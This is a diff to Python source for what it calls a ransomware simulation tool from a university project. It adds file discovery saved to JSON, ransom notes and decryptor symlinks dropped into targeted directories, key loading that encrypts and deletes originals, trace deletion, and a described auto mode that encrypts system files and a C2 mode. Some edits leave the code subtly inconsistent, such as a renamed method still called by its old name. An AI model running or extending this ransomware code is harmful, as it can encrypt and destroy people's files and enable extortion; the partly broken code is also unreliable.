@@ -2,14 +2,15 @@ import os
 from crypto import CryptoGraphy
 
 class Program():
-    def __init__(self, data = None):
-        self.__mode__ = "manual"  # default mode
-        self.__system__ = "Darwin"  # default system
+    def __init__(self, data = None, mode = "manual", system = "Darwin"):
+        self.__mode__ = mode 
+        self.__system__ = system
         self.__criptography: CryptoGraphy = None
         self.__directories_with_files = []
         self.__found_files = []
         if data is not None:
-            pass
+            self.__found_files = data.get("found_files", [])
+            self.__directories_with_files = data.get("directories_with_files", [])
         
     def start(self):
         print("This is the ransomware main module.")
@@ -41,8 +42,18 @@ class Program():
 
     def __info(self):
         print("This code is a ransomware simulation tool made for educational purposes as part of a university research project.")
-        print("It is still able to encrypt files in your system, so be cautious when using it, specially in auto mode")
-                
+        print("It is still able to encrypt files in your system, so be cautious when using it, specially in auto mode.\n")
+        print("The program is currently running in", self.__mode__, "mode.")
+        print("In this mode the program requires user interaction to proceed with its operations.")
+        print("In this mode, It does not require for further action to decrypt the files once encrypted.")
+        print("This mode requires to force the actions in order to proceeed with things that would usually execute back to back.")
+        print("\n")                
+        print("If the mode is chanaged to auto, the program will run without user interaction, and system files will be encrypted.")
+        print("In auto mode, once the files are encrypted, the decryption will not proceed automatically.")
+        print("To decrypt the files, the user will need to follow the steps written in the ransom note.")
+        print("\n")
+        print("USE AT YOUR OWN RISK!\n")
+
     def __change_mode(self, new_mode = "manual"):
         self.__mode__ = new_mode
         print(f"Mode changed to {self.__mode__}")
@@ -53,7 +64,7 @@ class Program():
                 print("C2 mode selected. The program will attempt to connect to a command and control server.")
             case "manual":
                 print("Manual mode selected. The program will wait for user input.")
-                
+
     def __envcheck(self):
         import platform
 
@@ -97,6 +108,12 @@ class Program():
             for f in files:
                 self.__found_files.append(os.path.join(root, f))
 
+        with open("discovered_info.json", "w") as output_file:
+            json.dump({
+                "found_files": self.__found_files,
+                "directories_with_files": self.__directories_with_files
+            }, output_file, indent=4)
+
         print(self.__directories_with_files)
         print(f"Total files found: {len(self.__found_files)}")
         print(f"Total directories with targeted files: {len(self.__directories_with_files)}")
@@ -119,14 +136,16 @@ class Program():
         with open("ransom_note.txt", "r") as note_file:
             content = note_file.read()
 
+        cwd = os.getcwd()
         for dir in self.__directories_with_files:
             self.__create_ransomnote_file(dir, content)
+            os.symlink(os.path.join(cwd, "decrypt.py"), os.path.join(dir, "decryptor.py"))
 
     def __create_ransomnote_file(self, dst_path=".", content=None):
         with open(dst_path + "/@README@.txt", "w") as output_file:
             output_file.write(content)
 
-    def __decrypt(self):
+    def decrypt(self):
         if self.__criptography is None:
             print("Cryptography not set up. Please run 'setup' first.")
             return
@@ -134,13 +153,16 @@ class Program():
         for file in self.__found_files:
             self.__criptography.decrypt(file + ".ENCRYPTED")
 
-    def __delete_traces(self):
+    def delete_traces(self):
         print("Deleting traces...")
         
         for dir in self.__directories_with_files:
             ransomnote_path = dir + "/@README@.txt"
             if os.path.exists(ransomnote_path):
                 os.remove(ransomnote_path)
+
+        if os.path.exists("discovered_info.json"):
+            os.remove("discovered_info.json")
 
     def __cli(self):
         while True:
@@ -185,7 +207,7 @@ class Program():
                     self.__ransomnote()
 
                 case "decrypt":
-                    self.__decrypt()
+                    self.decrypt()
 
                 case "deletetraces":
                     self.__delete_traces()
@@ -200,7 +222,10 @@ class Program():
                 case _:
                     print(f"Unknown command: {command}")
 
-
+    def load_key(self, key_filename: str = "secret.key"):
+        if self.__criptography is None:
+            self.__criptography = CryptoGraphy(should_encrypt=True, should_delete_original=True)
+        self.__criptography.load_key(key_filename)
 
 if __name__ == "__main__":
     program = Program()
